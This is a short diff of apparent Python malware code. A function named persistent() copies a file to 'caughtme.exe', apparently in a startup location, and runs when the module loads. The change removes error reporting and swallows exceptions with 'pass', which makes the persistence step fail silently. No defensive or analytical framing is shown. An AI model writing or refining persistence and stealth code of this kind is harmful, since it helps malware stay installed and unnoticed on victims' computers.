@@ -13,7 +13,6 @@ def persistent():
             destination_file = open('caughtme.exe', 'wb')
             shutil.copyfileobj(source_file, destination_file)
     except Exception as err:
-        # return bytes("Couldn't upload to start up file", 'utf-8')
-        return print(err)
+        pass
     
 persistent()
